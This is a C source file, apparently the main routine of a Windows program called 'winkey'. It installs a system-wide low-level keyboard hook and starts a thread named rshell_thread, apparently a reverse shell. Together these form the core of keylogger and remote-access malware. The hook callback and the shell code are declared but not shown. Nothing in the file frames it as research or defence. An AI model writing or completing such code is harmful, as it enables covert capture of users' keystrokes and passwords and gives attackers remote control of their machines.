#include "common.h"


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI rshell_thread(LPVOID param);

int wmain(void) {
	HANDLE mtx = CreateMutexW(NULL, TRUE, WINKEY_MUTEX);
	if (!mtx || GetLastError() == ERROR_ALREADY_EXISTS) {
		wprintf(L"Another instance of winkey is already running.\n");
		return 0;
	}

	HHOOK hook =
		SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
			GetModuleHandleW(NULL), 0);

	CreateThread(NULL, 0, rshell_thread, NULL, 0, NULL);

	MSG msg;
	while (GetMessageW(&msg, NULL, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}

	UnhookWindowsHookEx(hook);
	ReleaseMutex(mtx);
	CloseHandle(mtx);
	return 0;
}